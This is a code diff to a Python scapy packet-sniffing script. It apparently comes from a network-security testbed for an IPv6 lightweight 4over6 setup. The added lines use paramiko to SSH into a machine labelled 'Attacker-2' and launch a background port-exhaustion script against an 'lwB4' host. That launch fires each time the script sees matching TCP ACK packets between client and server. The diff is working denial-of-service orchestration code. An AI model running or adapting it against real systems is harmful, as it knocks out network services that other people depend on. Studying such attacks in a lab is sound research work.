@@ -2,6 +2,38 @@
 
 from scapy.all import *
 from scapy.layers.l2 import Ether
+import paramiko
+
+# Define SSH credentials
+ssh_host = "192.168.79.156"  # Attacker-2 IPv4 address
+ssh_port = 22
+ssh_username = "your_username" # Replace with the actual username
+ssh_password = "your_password"  # Replace with the actual password
+
+# Establish SSH connection and execute command
+def execute_ssh_commands():
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(ssh_host, ssh_port, ssh_username, ssh_password)
+    
+    # Specify the commands to run on the remote machine
+    remote_commands = [
+        "nohup conda deactivate &",
+        "nohup /root/port-exahust.sh &"
+    ]
+    
+    # Execute the commands
+    for command in remote_commands:
+        stdin, stdout, stderr = ssh.exec_command(command)
+        
+        # Print command output (if needed)
+        print(f"Command: {command}")
+        print(stdout.read().decode("utf-8"))
+    
+    # Close the SSH connection
+    ssh.close()
+
+
 
 # The script sniffs the channel on ens34 and looks for TCP packet "A" flag and acts accordingly.
 
@@ -9,6 +41,10 @@ from scapy.layers.l2 import Ether
 def process_packet(packet):
     # Check if the packet is a TCP packet with "A" flag heading from Client to Server
     if TCP in packet and packet[IPv6].src == "2001:db8:0:1::2" and packet[TCP].flags == 'A':
+        
+        # SSH to the Attacker-2 and excute port exahustion attack from there against the lwB4 machine
+        execute_ssh_commands()
+
         # Create the Ethernet layer
         mac_src = packet[Ether].dst
         mac_dst = packet[Ether].src
@@ -65,6 +101,9 @@ def process_packet(packet):
 
     # Check if the packet is a TCP packet with "A" flag heading from Server to Client
     elif TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'A':
+        # SSH to the Attacker-2 and excute port exahustion attack from there against the lwB4 machine
+        execute_ssh_commands()
+
         print(f"Found TCP packet with A flag from Server to Client")
         # Create the Ethernet layer
         mac_src = packet[Ether].dst
